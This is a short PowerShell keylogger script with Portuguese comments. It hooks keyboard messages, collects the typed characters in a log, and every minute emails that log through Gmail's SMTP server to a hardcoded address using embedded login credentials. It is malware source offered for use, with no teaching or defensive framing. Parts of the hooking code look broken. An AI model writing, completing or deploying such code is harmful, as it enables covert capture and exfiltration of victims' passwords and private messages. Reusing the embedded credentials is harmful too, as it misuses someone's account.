
Add-Type -AssemblyName System.Windows.Forms
# Configurações de e-mail
$smtpServer = 'smtp.gmail.com'
$smtpPort   = 587
$smtpUser   = 'driiverr1@gmail.com'
$smtpPass   = 'gfpu dqgk wzfg sxgm'
$from       = 'driiverr1@gmail.com'
$to         = 'driiverr1@gmail.com'
# Timer e log
$global:Log = ''
$timer = New-Object Timers.Timer(60000)
$timer.AutoReset = $true
$timer.add_Elapsed({
    if ($global:Log) {
        $msg = New-Object Net.Mail.MailMessage($from,$to,("Keylog " + (Get-Date)), $global:Log)
        $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtp.EnableSsl = $true
        $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)
        $smtp.Send($msg)
        $global:Log = ''
    }
})
$timer.Start()
# Hook
[System.Windows.Forms.Application]::AddMessageFilter(
    New-Object Windows.Forms.IMessageFilter -ArgumentList { param($m)
        if ($m.Msg -eq 0x0101) { $ch = [char]$m.WParam; switch($ch) { ' ' { $global:Log += ' ' } '' { $global:Log += '[ENTER]`n' } default { $global:Log += $ch } } }
        return $false
    }
)
while ($true) { Start-Sleep -Seconds 1 }
